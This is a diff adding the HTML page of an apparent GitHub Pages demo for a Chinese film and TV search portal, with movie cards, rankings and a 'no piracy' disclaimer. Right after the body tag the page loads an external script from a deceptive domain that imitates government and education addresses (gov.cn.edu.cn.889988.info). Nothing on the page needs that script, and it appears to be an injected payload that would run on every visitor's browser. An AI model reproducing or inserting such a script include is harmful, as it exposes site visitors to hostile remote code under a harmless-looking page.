@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>神马影视网 - 神马都能搜，好片直接看 | shenmayingshiwang-h5.github.io</title>
+<meta name="description" content="神马影视网（shenmayingshiwang-h5.github.io）电影、电视剧、综艺、动漫、短剧、纪录片一搜即达：大搜索框、今日更新、热播矩阵、地区/类型直进，移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="神马影视网,shenmayingshiwang-h5,神马影视,电影,电视剧,综艺,动漫,短剧,今日更新" />
+<link rel="canonical" href="https://shenmayingshiwang-h5.github.io/" />
+<style>
+:root{
+  --blue:#2D7FF9;--sky:#7CC4FF;--cloud:#F5F8FF;--ink:#10151F;--gray:#5B6678;
+  --orange:#FF7A1A;--line:rgba(45,127,249,.25);--glass:rgba(255,255,255,.7);--maxw:1140px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:linear-gradient(180deg,#EAF2FF 0%,#F5F8FF 40%,#FFFFFF 100%);
+  color:var(--ink);line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+.blob{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.blob::before{content:"";position:absolute;top:-14%;left:-6%;width:440px;height:440px;background:radial-gradient(circle,rgba(124,196,255,.45),transparent 70%);animation:float 9s ease-in-out infinite}
+.blob::after{content:"";position:absolute;bottom:-16%;right:-6%;width:460px;height:460px;background:radial-gradient(circle,rgba(45,127,249,.18),transparent 70%);animation:float 11s ease-in-out infinite reverse}
+@keyframes float{0%,100%{transform:scale(1);opacity:.6}50%{transform:scale(1.12);opacity:1}}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(255,255,255,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.logo-icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--blue),var(--sky));
+  display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 6px 18px rgba(45,127,249,.35)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:500}
+.menu{margin-left:auto;display:flex;gap:4px}
+.menu a{padding:7px 14px;border-radius:8px;font-size:13px;color:var(--gray);transition:.2s;font-weight:600}
+.menu a:hover{background:rgba(45,127,249,.1);color:var(--blue)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:120px;padding:8px 14px;border-radius:8px;border:1px solid var(--line);background:#fff;color:var(--ink);outline:none;font-size:13px}
+.search-min button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--blue);color:#fff;font-size:13px}
+.burger{display:none;margin-left:auto;background:#fff;border:1px solid var(--line);color:var(--ink);border-radius:8px;padding:6px 10px;font-size:16px}
+
+/* hero 大搜索 */
+.hero{position:relative;z-index:1;margin:24px 0 8px;border-radius:28px;overflow:hidden;background:#fff;border:1px solid var(--line);
+  padding:46px 40px;min-height:300px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
+.hero h1{font-size:34px;margin:0 0 6px}
+.hero h1 em{font-style:normal;color:var(--blue)}
+.hero p{color:var(--gray);font-size:15px;margin:0 0 22px}
+.bigsearch{width:100%;max-width:640px;display:flex;gap:8px;background:#fff;border:2px solid var(--blue);border-radius:999px;padding:6px 6px 6px 18px;box-shadow:0 12px 30px rgba(45,127,249,.18)}
+.bigsearch input{flex:1;border:0;outline:none;font-size:15px;background:transparent;color:var(--ink)}
+.bigsearch button{border:0;padding:10px 24px;border-radius:999px;background:linear-gradient(135deg,var(--blue),var(--sky));color:#fff;font-weight:900;cursor:pointer;font-size:14px}
+.quick{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:18px}
+.quick a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;background:rgba(45,127,249,.08);color:var(--blue)}
+.quick a:hover{background:rgba(45,127,249,.16)}
+
+.section{padding:34px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;margin:0}
+.sec-head h2::before{content:"🐎 ";}
+.sec-head h2 .b{color:var(--blue)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--orange);font-size:12px;font-weight:800}
+
+.cats{display:flex;gap:10px;flex-wrap:wrap}
+.cat{display:flex;align-items:center;gap:8px;padding:12px 18px;border-radius:14px;background:#fff;border:1px solid var(--line);font-weight:800;font-size:14px;transition:.2s}
+.cat:hover{transform:translateY(-2px);border-color:var(--blue);box-shadow:0 10px 24px rgba(45,127,249,.15)}
+.cat .ic{font-size:20px}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{border-radius:18px;overflow:hidden;background:#fff;border:1px solid var(--line);transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--blue);box-shadow:0 14px 32px rgba(45,127,249,.18)}
+.cover{aspect-ratio:3/4;border-radius:16px 16px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#0a2a55,#2D7FF9)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#5a1f00,#FF7A1A)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#063a36,#1FB6A6)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#2a0f3a,#8A7BFF)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#3a2c06,#FFC857)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#102a4d,#5AA9FF)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#33111f,#FF6B9D)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#1c1f24,#7C879B)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:var(--orange);color:#fff}
+.flag.new{background:var(--blue)}
+.flag.hot{background:#FF3B5C}
+.cover h4{margin:auto 0 0;font-size:14px;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.5);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:#EEF3FF;color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray);line-height:1.5}
+
+.zones{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.zone{border-radius:16px;padding:18px;background:#fff;border:1px solid var(--line);transition:.25s}
+.zone:hover{transform:translateY(-3px);border-color:var(--sky)}
+.zone .ic{font-size:24px}
+.zone h3{font-size:14px;margin:8px 0 3px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.rk{display:flex;align-items:center;gap:14px;background:#fff;border:1px solid var(--line);border-radius:16px;padding:14px 18px;transition:.25s}
+.rk:hover{border-color:var(--orange);background:#FFF7F0}
+.rk-num{font-size:22px;font-weight:900;color:var(--blue);width:34px;text-align:center;flex-shrink:0}
+.rk-num.top{color:var(--orange)}
+.rk-info{flex:1}
+.rk-info h4{margin:0 0 2px;font-size:14px}
+.rk-info span{font-size:11px;color:var(--gray)}
+.rk-tag{font-size:12px;font-weight:800;color:var(--orange);flex-shrink:0}
+
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:20px}
+.about-card{border-radius:22px;padding:24px;background:#fff;border:1px solid var(--line)}
+.about-card h3{font-size:18px;margin:0 0 12px}
+.about-card h3::before{content:"🐎 ";}
+.about-card p,.about-card li{font-size:13px;color:var(--gray);line-height:1.8}
+.about-card ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:12px;margin-top:16px}
+.stat{flex:1;text-align:center;padding:14px;border-radius:16px;background:rgba(45,127,249,.07);border:1px solid var(--line)}
+.stat b{display:block;font-size:20px;color:var(--blue)}
+.stat span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid var(--line);padding:28px 0 44px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1;background:#fff}
+footer.site a{color:var(--blue)}
+code{background:#EEF3FF;border:1px solid var(--line);padding:2px 8px;border-radius:6px;color:var(--ink);font-size:11px;font-family:"Courier New",monospace}
+
+@media(max-width:980px){.grid,.zones{grid-template-columns:repeat(2,1fr)}.rank{grid-template-columns:1fr}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#fff;border-bottom:1px solid var(--line);padding:10px 16px;gap:4px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:84px}.hero h1{font-size:24px}
+  .grid,.zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="blob"></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="logo-icon">🐎</div>
+      <div>神马影视网<small>shenmayingshiwang-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#series">剧集</a>
+      <a href="#va">综艺动漫</a>
+      <a href="#short">短剧纪录</a>
+      <a href="#about">关于神马</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="搜片名" aria-label="搜索" />
+      <button onclick="alert('演示站：搜索用 # 占位')">搜</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <h1>神马影视网，<br/><em>神马都能搜，好片直接看</em></h1>
+    <p>电影、剧集、综艺、动漫、短剧、纪录片，输一个词就出结果。更新快、分类平、不绕路。</p>
+    <div class="bigsearch">
+      <input type="text" placeholder="想看什么？片名 / 演员 / 类型 / 地区" aria-label="大搜索" />
+      <button onclick="alert('演示站：搜索结果用 # 占位')">神马一下</button>
+    </div>
+    <div class="quick">
+      <a href="#movie">最新电影</a>
+      <a href="#series">热播剧</a>
+      <a href="#va">新番动漫</a>
+      <a href="#short">短剧</a>
+      <a href="#rank">热搜榜</a>
+      <a href="#zones">按地区找</a>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="sec-head"><h2><span class="b">快捷</span>分类</h2><span>Pick a lane</span></div>
+    <div class="cats">
+      <a class="cat" href="#movie"><span class="ic">🎬</span>电影</a>
+      <a class="cat" href="#series"><span class="ic">📺</span>电视剧</a>
+      <a class="cat" href="#va"><span class="ic">🎤</span>综艺</a>
+      <a class="cat" href="#va"><span class="ic">🐉</span>动漫</a>
+      <a class="cat" href="#short"><span class="ic">📱</span>短剧</a>
+      <a class="cat" href="#short"><span class="ic">🎥</span>纪录片</a>
+      <a class="cat" href="#zones"><span class="ic">🌏</span>欧美/韩/日/泰</a>
+      <a class="cat" href="#rank"><span class="ic">🏆</span>排行榜</a>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">今日更新</span>电影</h2><span>Today · Movies</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag new">今日上新</span><h4>流浪地球3</h4></div><div class="body"><div class="tags"><span>科幻</span><span>国产</span><span>2026</span></div><p>太阳系的赌局继续，IMAX 感拉满。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hot">热</span><h4>唐探1900</h4></div><div class="body"><div class="tags"><span>喜剧</span><span>悬疑</span><span>系列</span></div><p>唐人街、蒸汽时代、笑里藏案。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">HD</span><h4>蛟龙行动</h4></div><div class="body"><div class="tags"><span>动作</span><span>军事</span><span>大片</span></div><p>深海、潜艇、营救，节奏不喘气。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag new">今日上新</span><h4>山谷来信</h4></div><div class="body"><div class="tags"><span>文艺</span><span>慢</span><span>国产</span></div><p>一封没寄出的信，牵出整座村子。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">4K</span><h4>沙丘2</h4></div><div class="body"><div class="tags"><span>科幻</span><span>史诗</span><span>4K</span></div><p>沙漠星球的权力游戏，粒子都清楚。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">1080P</span><h4>盗梦空间</h4></div><div class="body"><div class="tags"><span>烧脑</span><span>诺兰</span><span>经典</span></div><p>梦里套梦，重看还是上头。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hot">热</span><h4>哪吒之魔童闹海</h4></div><div class="body"><div class="tags"><span>动画</span><span>国漫</span><span>2026</span></div><p>闹海、父子、天命，燃度拉满。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">修复</span><h4>霸王别姬</h4></div><div class="body"><div class="tags"><span>经典</span><span>文艺</span><span>4K修复</span></div><p>一辈子、一出戏、一个时代。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="series">
+    <div class="sec-head"><h2><span class="b">热播</span>剧集</h2><span>Hot Series</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">热播</span><h4>狂飙</h4></div><div class="body"><div class="tags"><span>犯罪</span><span>国产</span><span>神剧</span></div><p>扫黑除恶二十年，角色一个比一个狠。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">更新中</span><h4>漫长的季节</h4></div><div class="body"><div class="tags"><span>悬疑</span><span>东北</span><span>高分</span></div><p>三个时间线，像年轮一样转。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag new">今日更新</span><h4>三体</h4></div><div class="body"><div class="tags"><span>科幻</span><span>国产</span><span>硬核</span></div><p>红岸、智子、倒计时，原著党狂喜。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">韩剧</span><h4>我的解放日志</h4></div><div class="body"><div class="tags"><span>治愈</span><span>社畜</span><span>慢热</span></div><p>不恋爱也能好看，社畜嘴替。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="va">
+    <div class="sec-head"><h2>综艺 / 动漫</h2><span>Variety & Anime</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">热</span><h4>歌手2024</h4></div><div class="body"><div class="tags"><span>音综</span><span>真唱</span><span>现场</span></div><p>一开嗓就上热搜，弹幕比舞台热闹。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag new">新番</span><h4>葬送的芙莉莲</h4></div><div class="body"><div class="tags"><span>奇幻</span><span>治愈</span><span>中字</span></div><p>冒险结束后的成长，后劲很大。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">国漫</span><h4>刺客伍六七</h4></div><div class="body"><div class="tags"><span>热血</span><span>沙雕</span><span>国风</span></div><p>理发师刺客，沙雕里全是情义。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">纪录</span><h4>地球脉动3</h4></div><div class="body"><div class="tags"><span>自然</span><span>BBC</span><span>4K</span></div><p>冰川、羽翼、瞳孔，自然片天花板。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="zones">
+    <div class="sec-head"><h2><span class="b">按地区</span>/类型直进</h2><span>Regions & Genres</span></div>
+    <div class="zones">
+      <div class="zone"><div class="ic">🇺🇸</div><h3>欧美</h3><p>美剧 / 好莱坞 / 纪录片</p></div>
+      <div class="zone"><div class="ic">🇰🇷</div><h3>韩剧韩综</h3><p>复仇 / 财阀 / 治愈 / 韩综</p></div>
+      <div class="zone"><div class="ic">🇯🇵</div><h3>日剧日番</h3><p>推理 / 治愈 / 新番 / 动画电影</p></div>
+      <div class="zone"><div class="ic">🇹🇭</div><h3>泰剧</h3><p>泰腐 / 豪门 / 重生 / 上头</p></div>
+      <div class="zone"><div class="ic">🇨🇳</div><h3>国产</h3><p>院线 / 网剧 / 国漫 / 短剧</p></div>
+      <div class="zone"><div class="ic">😂</div><h3>喜剧</h3><p>合家欢 / 黑色幽默 / 脱口秀</p></div>
+      <div class="zone"><div class="ic">🕵️</div><h3>悬疑</h3><p>刑侦 / 推理 / 时间线玩法</p></div>
+      <div class="zone"><div class="ic">🚀</div><h3>科幻</h3><p>太空 / AI / 末日 / 硬核物理</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="short">
+    <div class="sec-head"><h2>短剧 / 纪录片</h2><span>Shorts & Docs</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">短剧热</span><h4>开局系统送奖励</h4></div><div class="body"><div class="tags"><span>逆袭</span><span>爽</span><span>竖屏</span></div><p>前脚报喜后脚被打脸，集集有反转。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">微短</span><h4>风沙过境，余生无你</h4></div><div class="body"><div class="tags"><span>虐恋</span><span>民国</span><span>百集</span></div><p>车站、信、旧照片，短剧也能哭。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">纪录</span><h4>城市恋歌：转角遇见你</h4></div><div class="body"><div class="tags"><span>都市</span><span>观察</span><span>纪实</span></div><p>把城市当主角，地铁口也能出故事。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">自然</span><h4>极境探索之旅</h4></div><div class="body"><div class="tags"><span>自然</span><span>4K</span><span>慢</span></div><p>冰原、深海、峡谷，适合大屏发呆。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head"><h2><span class="b">神马</span>热搜榜</h2><span>What people search</span><a class="more" href="#">完整榜单 #</a></div>
+    <div class="rank">
+      <div class="rk"><div class="rk-num top">1</div><div class="rk-info"><h4>流浪地球3</h4><span>电影 / 国产科幻</span></div><div class="rk-tag">🔥 热搜 99</div></div>
+      <div class="rk"><div class="rk-num top">2</div><div class="rk-info"><h4>狂飙</h4><span>剧集 / 犯罪</span></div><div class="rk-tag">🔥 热搜 97</div></div>
+      <div class="rk"><div class="rk-num top">3</div><div class="rk-info"><h4>三体</h4><span>剧集 / 硬核科幻</span></div><div class="rk-tag">🔥 热搜 95</div></div>
+      <div class="rk"><div class="rk-num">4</div><div class="rk-info"><h4>葬送的芙莉莲</h4><span>动漫 / 新番</span></div><div class="rk-tag">🔥 热搜 93</div></div>
+      <div class="rk"><div class="rk-num">5</div><div class="rk-info"><h4>我的解放日志</h4><span>韩剧 / 治愈</span></div><div class="rk-tag">🔥 热搜 91</div></div>
+      <div class="rk"><div class="rk-num">6</div><div class="rk-info"><h4>开局系统送奖励</h4><span>短剧 / 逆袭</span></div><div class="rk-tag">🔥 热搜 89</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于神马影视网</h2><span>About</span></div>
+    <div class="about">
+      <div class="about-card">
+        <h3>神马影视网是什么？</h3>
+        <p>神马影视网（shenmayingshiwang-h5.github.io）是一个“搜索优先”的影视聚合导航演示页：电影、剧集、综艺、动漫、短剧、纪录片全摆上台面，大搜索框先出场，分类/地区/榜单兜底，适合“我不知道看啥，但想马上找到”的场景。</p>
+        <div class="stats">
+          <div class="stat"><b>6</b><span>大类</span></div>
+          <div class="stat"><b>8</b><span>地区/类型入口</span></div>
+          <div class="stat"><b>100%</b><span>移动端适配</span></div>
+        </div>
+      </div>
+      <div class="about-card">
+        <h3>演示说明</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>神马蓝 + 云白，官方入口感、轻、快</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    神马影视网 · <a href="https://shenmayingshiwang-h5.github.io/">shenmayingshiwang-h5.github.io</a><br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 神马影视网 Demo · 神马都能搜，好片直接看
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
